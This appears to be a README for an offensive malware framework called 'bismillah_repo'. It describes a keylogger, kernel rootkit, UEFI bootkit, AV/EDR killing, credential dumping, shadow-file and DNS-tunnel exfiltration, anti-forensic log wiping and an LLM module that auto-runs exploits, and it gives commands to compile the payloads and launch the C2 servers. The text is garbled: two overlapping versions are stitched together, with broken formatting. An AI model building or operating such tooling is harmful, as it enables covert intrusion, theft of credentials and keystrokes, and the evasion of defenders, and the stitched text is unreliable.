# Bismillah Repo: All-In-One Multi-Platform Offensive Framework (v3.0)

> **Disclaimer:** For authorized red-team/research use **only**. Deploy in isolated lab environments.  
> Do **NOT** use against unconsented targets.

---

## Overview

**bismillah_repo/** is a modular, multi-vector offensive toolkit featuring:

1. **Multi-OS C2:**  
   - HTTPS + WebSockets (AES-GCM encrypted).  
   - DNS / DNS-over-HTTPS (DoH) fallback with rotating subdomains.  

2. **Auto-Update:**  
   - Periodically fetches new exploit modules from a remote YAML index (Log4Shell, ProxyLogon, BlueKeep, etc.).  

3. **Anti-Analysis & Stealth (v3.0):**  
   - Kills/suspends AV/EDR processes on Windows/Linux/macOS.  
   - Renames/hides own process.  
   - Kernel rootkit to intercept syscalls (hide files/processes, block log reads).  
   - Real-time XOR obfuscation of Python modules; auto-deobfuscation prior to load.  

4. **Persistence (v3.0):**  
   - Windows: Hollowed SVCHOST service + registry Run key + event log disable.  
   - Linux: Systemd + cron + self-healing scripts + iptables rules for form-storage.  
   - macOS: LaunchAgent + hidden folder + TCC bypass + self-heal.  
   - UEFI: Persistent UEFI variable + boot-time hook + self-repair.  

5. **Expanded Reconnaissance (v3.0):**  
   - Nmap full-port/UDP sweeps + ARP/ICMP ping scans.  
   - DNS enumeration + subdomain fuzzing + certificate transparency.  
   - Shodan API (if configured).  
   - Wireless scanning + ARP poisoning for MITM (Linux only).  
   - Local process/socket enumeration.  
   - SMB share enumeration.  

6. **Lateral Movement (v3.0):**  
   - SSH pivot + dynamic port realloc + multi-hop.  
   - SMB spread + WMI remote execution + brutal SMB relay.  
   - Kerberos ticket harvesting (Impacket).  
   - Windows WMI silent execution for fileless payloads.  

7. **Anti-Forensics (v3.0):**  
   - Clears bash/Zsh history, wipes log files, tampers time stamps.  
   - Hides Windows Event Logs, rotates them.  
   - Overwrites `/var/log` on Linux; scrubs TCC logs on macOS.  

8. **Keylogger (v3.0):**  
   - Cross-platform keylogger:  
     - Windows: low-level keyboard hook.  
     - Linux: `/dev/input` sniffing.  
     - macOS: `CGEventTap` capture.  
   - Encrypts keystrokes to SQLite.  

9. **Post-Exploit (v3.0):**  
   - Windows: Credential dump (Impacket & Mimikatz), token manipulation.  
   - Linux: SUID binaries, `/etc/shadow` exfil.  
   - Cross-platform exfil via DNS tunnel, HTTP(S), and ICMP.  

10. **AI-Driven Tasking (v3.0):**  
    - Ingests JSON tasks (auto fingerprint).  
    - Can auto-run simple “find open ports” or “run exploit” instructions.  

11. **Encrypted Logging (v3.0):**  
    - AES-GCM encryption at rest in SQLite + secure deletion of old logs.  
    - Rotating FileHandler + compression + optional remote syslog + timeline tampering.  

12. **Exploit Suite (v3.0):**  
    - PoCs for CVE-2019-0708 (BlueKeep), CVE-2020-0796 (SMBGhost), CVE-2021-26855 (ProxyLogon), CVE-2021-34527 (PrintNightmare),  
      CVE-2021-21985 (VMware vCenter), CVE-2021-44228 (Log4Shell), MS17-010 (EternalBlue), plus standalone POCs.  

---

## Quick Start

1. **Clone Repo & Install Dependencies**  
   ```bash
   cd /opt
   git clone https://example.com/bismillah_repo.git
   cd bismillah_repo
   pip3 install -r requirements.txt
#Generate/Install TLS Certificates

bash
Copy
Edit
mkdir -p certs
openssl req -newkey rsa:2048 -nodes -keyout certs/bismillah.key \
    -x509 -days 365 -out certs/bismillah.crt -subj "/CN=bismillah.local"
Compile C Payloads & Rootkits

bash
Copy
Edit
# Windows payloads (Linux with MinGW)
cd windows_payloads
make

# macOS payloads (on a real macOS host)
cd ../macos_payloads
chmod +x launchd_persistence.sh
clang -O2 -mmacosx-version-min=10.12 -o mem_malware mem_malware.c
clang -framework CoreFoundation -framework Security -lsqlite3 -o tcc_allowlist_bypass tcc_allowlist_bypass.c

# Linux rootkit
cd ../kernel_rootkit
make

# UEFI bootkit (requires EDK2 environment)
cd ../uefi_bootkit
make
Initialize Exploit Manager

bash
Copy
Edit
python3 - <<EOF
from modules.exploit_manager import ExploitManager
mgr = ExploitManager()
print("Indexed exploits:", mgr.list_exploits())
new = mgr.fetch_latest_exploits()
print("Fetched new exploits:", new)
EOF

bash
Copy
Edit

5. **Launch C2 Servers**  
```bash
# Terminal 1: HTTPS + WebSocket C2
python3 tools/c2_server.py

# Terminal 2: DNS + DoH C2
python3 tools/dns_c2_server.py
Start the Framework

bash
Copy
Edit
cd /opt/bismillah_repo
python3 bismillah.py
This spawns anti-forensics, keylogger, recon, lateral, persistence, post-exploit, AI-C2 loops, rootkit, etc.

Interactive Console

text
Copy
Edit
Bismillah> list_exploits
Bismillah> run_exploit cve_2021_44228_log4shell target.com
Bismillah> show_tasks
Bismillah> clear_logs
Bismillah> quit
Verify No Zero-Byte Files

bash
Copy
Edit
find . -type f -size 0
# Should return nothing.
# Bismillah Repo: Multi‐Platform Offensive Toolkit (v3.0)

> **Disclaimer:** This framework is strictly for research and red‐team use in isolated labs. Do **NOT** use against systems without explicit permission.

---

## Overview

**bismillah_repo/** has been upgraded to v3.0, featuring:

1. **Even Stronger C2**  
   - HTTPS + WebSockets (AES‐GCM encryption)  
   - DNS/TXT + DNS‐over‐HTTPS (DoH) + DNS tunneling fallback (TXT over fragmented subdomains)  
   - Automatic subdomain rotation and pseudo‐random jitter on each beacon to thwart signature‐based detection.  
   - **New:** MQTT‐over‐TLS C2 fallback (for environments where HTTP/S is blocked but MQTT is allowed).

2. **Advanced Anti‐Forensics & Evasion**  
   - Kernel‐level rootkit (`sardar_rootkit.c`) that hides processes/files with configurable patterns and can blank memory regions on unmap.  
   - **New:** UEFI bootkit (`payload_uefi.c`) now self‐encrypts its own image and decrypts at runtime to avoid static detection.  
   - **New:** In‐memory reflective DLL loading for Windows payloads to bypass disk writes.  
   - Real‐time XOR obfuscation + polymorphic mutation of Python modules (every 24 hours) to vary XOR key.  
   - Drifts log file names daily (anti‐forensic), writes rotating logs to RAM‐disk if available.

3. **Expanded Persistence & Self‐Healing**  
   - **Windows:** Service now employs double‐hollowing (spawn legitimate process → hollow back to COM‐powered shellcode).  
   - **Linux:** Systemd service monitors itself via watchdog, plus BPF‐based hide logic.  
   - **macOS:** LaunchAgent now includes a Base64‐encoded version in a hidden SQLite DB; if tampered, it reconstructs itself.  
   - **New:** Crontab entry for Linux now cycles once per hour to refresh stealth binaries.

4. **Enhanced Recon & Lateral Movement**  
   - **Recon:**  
     - Nmap banner grabbing + NSE scripts for deeper fingerprinting.  
     - Shodan now double‐checks tags (e.g., SSL cert search).  
     - **New:** Passive DNS lookup integration (via DNSDB or PassiveTotal API, if key provided).  
   - **Lateral:**  
     - SSH pivot now supports multi‐hop chaining (can archive a chain file of jumps).  
     - SMB spread now also attempts PSExec (via Impacket), WMI execution, and `wmic` fallback.  
     - **New:** RDP brute‐force module integrated (with a small wordlist) for Windows hosts.

5. **Expanded ExploitLibrary**  
   - Added **CVE‐2022‐21999** (Hypothetical example) for Linux SUDO bypass.  
   - Each PoC now logs via a dual‐channel (SQLite + syslog + optional HTTP‐POST to remote collector).  
   - Modules are now validated against a local CRC32 to ensure integrity.

6. **Post‐Exploit & Exfiltration**  
   - **Windows:**  
     - In‐memory Mimikatz extraction via reflective loading (no disk drop).  
     - WDigest patch or unpatch based on config.  
   - **Linux:**  
     - Automatic detection of `sudo` privileges; can plant a root‐level PID namespace sandbox to hide further actions.  
   - **macOS:**  
     - Leverage `tccutil` to reset privacy settings if needed.  
   - **New:** Exfiltration via DNS tunneling (modulates exfil chunks into subdomains).  
   - **New:** Egress via HTTPS + WebSocket to a remote collector, with optional multi‐region failover.

7. **AI‐C2 Improvements**  
   - Now integrates a local OpenAI‐like LLM (mock) to auto‐generate custom PowerShell or Bash one‐liners for reconnaissance.  
   - **New:** If an “LLM key” is provided, Bismillah will call out to a local GPT‐based service to craft reconnaissance queries or format reports.

8. **Logging & Configuration**  
   - AES‐GCM remains for SQLite, but we now include **forward secrecy** by deriving a new ephemeral key every 24 h.  
   - Rotating logs are now encrypted on disk with ChaCha20.  
   - **config.json** has been expanded; now supports environment variable overrides for every field.  
   - **README.md** has been updated with new usage instructions and best practices.

---

## Quick Start

1. **Edit `config.json`**  
   - Configure AES keys/IVs, C2 hosts/ports, persistence paths, exploit timeouts, stealth patterns, new MQTT settings, etc.  
   - You can override any field by setting `BISMILLAH_<SECTION>_<KEY>` as an environment variable.  

2. **Install Dependencies**  
   ```bash
   cd /opt/bismillah_repo
   pip3 install -r requirements.txt
#Generate/Install TLS Certificates

bash
Copy
Edit
mkdir -p certs
openssl req -newkey rsa:4096 -nodes -keyout certs/bismillah.key \
    -x509 -days 730 -out certs/bismillah.crt -subj "/CN=bismillah.local"
Compile C Payloads

bash
Copy
Edit
# Windows payloads (on Linux with MinGW‐w64)
cd windows_payloads
make

# macOS payloads (on macOS)
cd ../macos_payloads
chmod +x launchd_persistence.sh
clang -O2 -mmacosx-version-min=10.12 -o mem_malware mem_malware.c
clang -framework CoreFoundation -framework Security -lsqlite3 -o tcc_allowlist_bypass tcc_allowlist_bypass.c

# Linux rootkit
cd ../kernel_rootkit
make

# UEFI Bootkit (EDK2 environment)
cd ../uefi_bootkit
make
Initialize Exploit Manager

bash
Copy
Edit
python3 - <<EOF
from modules.exploit_manager import ExploitManager
mgr = ExploitManager()
print("Indexed exploits:", mgr.list_exploits())
new = mgr.fetch_latest_exploits()
print("Fetched new exploits:", new)
EOF

bash
Copy
Edit

6. **Launch C2 Servers**  
```bash
# Terminal 1: HTTPS+WS C2
python3 tools/c2_server.py

# Terminal 2: DNS+DoH DNS C2
python3 tools/dns_c2_server.py
Start the Framework (Excluding hey_mama.py)

bash
Copy
Edit
cd /opt/bismillah_repo
python3 bismillah.py